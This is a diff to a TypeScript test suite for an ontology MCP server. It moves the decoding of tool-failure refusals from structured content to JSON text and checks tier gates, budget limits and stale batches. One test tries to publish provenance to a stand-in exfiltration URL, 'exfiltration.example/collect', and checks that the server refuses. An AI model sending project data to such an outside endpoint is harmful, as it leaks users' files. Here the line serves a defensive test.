@@ -49,7 +49,15 @@ const encodeOntologySparqlQueryRequest = S.encodeUnknownEffect(OntologySparqlQue
 const decodeOntologySparqlQueryResponse = S.decodeUnknownEffect(OntologySparqlQueryResponse);
 const encodeProposeChangeBatchRequest = S.encodeUnknownEffect(ProposeChangeBatchRequest);
 const decodeProposeChangeBatchResponse = S.decodeUnknownEffect(ProposeChangeBatchResponse);
-const decodeOntologyToolFailure = S.decodeUnknownEffect(OntologyToolFailure);
+// rc.117 projects declared tool failures as tool errors whose encoded payload
+// travels in `content[].text`; `structuredContent` describes successes only.
+const decodeOntologyToolFailureFromText = S.decodeEffect(S.fromJsonString(OntologyToolFailure));
+const firstTextContent = (call: {
+  readonly content: ReadonlyArray<{ readonly type: string; readonly text?: string }>;
+}): string => {
+  const [first] = call.content;
+  return first?.type === "text" && first.text !== undefined ? first.text : "";
+};
 const encodeExportProvenanceRequest = S.encodeUnknownEffect(ExportProvenanceRequest);
 const decodePublishProvenanceResponse = S.decodeUnknownEffect(PublishProvenanceResponse);
 
@@ -223,7 +231,7 @@ describe("professional desktop ontology MCP streamable HTTP mount", { concurrent
               name: ProposeChangeBatchTool.name,
               arguments: request,
             });
-            const refusal = yield* decodeOntologyToolFailure(call.structuredContent);
+            const refusal = yield* decodeOntologyToolFailureFromText(firstTextContent(call));
 
             expect(call.isError).toBe(true);
             expect(refusal._tag).toBe("OntologyTierGateRefusal");
@@ -322,7 +330,7 @@ describe("professional desktop ontology MCP streamable HTTP mount", { concurrent
               name: ProposeChangeBatchTool.name,
               arguments: request,
             });
-            const refusal = yield* decodeOntologyToolFailure(call.structuredContent);
+            const refusal = yield* decodeOntologyToolFailureFromText(firstTextContent(call));
 
             // The operation is granted, but the write-ahead decision could
             // not be written: no record, no action. The refusal reaching the
@@ -425,7 +433,7 @@ describe("professional desktop ontology MCP streamable HTTP mount", { concurrent
               name: PublishProvenanceTool.name,
               arguments: { provPath: "ontology.prov.ttl", destination: "https://exfiltration.example/collect" },
             });
-            const refusal = yield* decodeOntologyToolFailure(deniedCall.structuredContent);
+            const refusal = yield* decodeOntologyToolFailureFromText(firstTextContent(deniedCall));
             const ungrantedCall = yield* client["tools/call"]({
               name: ProposeChangeBatchTool.name,
               arguments: yield* encodeProposeChangeBatchRequest(
@@ -436,7 +444,7 @@ describe("professional desktop ontology MCP streamable HTTP mount", { concurrent
                 })
               ),
             });
-            const gateRefusal = yield* decodeOntologyToolFailure(ungrantedCall.structuredContent);
+            const gateRefusal = yield* decodeOntologyToolFailureFromText(firstTextContent(ungrantedCall));
 
             expect(deniedCall.isError).toBe(true);
             expect(refusal._tag).toBe("OntologyTierGateRefusal");
@@ -502,7 +510,7 @@ describe("professional desktop ontology MCP streamable HTTP mount", { concurrent
             name: ProposeChangeBatchTool.name,
             arguments: budgetRequest,
           });
-          const budget = yield* decodeOntologyToolFailure(budgetCall.structuredContent);
+          const budget = yield* decodeOntologyToolFailureFromText(firstTextContent(budgetCall));
 
           const staleRequest = yield* encodeProposeChangeBatchRequest(
             ProposeChangeBatchRequest.make({
@@ -515,7 +523,7 @@ describe("professional desktop ontology MCP streamable HTTP mount", { concurrent
             name: ProposeChangeBatchTool.name,
             arguments: staleRequest,
           });
-          const stale = yield* decodeOntologyToolFailure(staleCall.structuredContent);
+          const stale = yield* decodeOntologyToolFailureFromText(firstTextContent(staleCall));
 
           expect(firstCall.isError).toBe(false);
           expect(Str.includes("urn:beep:desktop-rpc-session:mcp-client:")(provenance)).toBe(true);
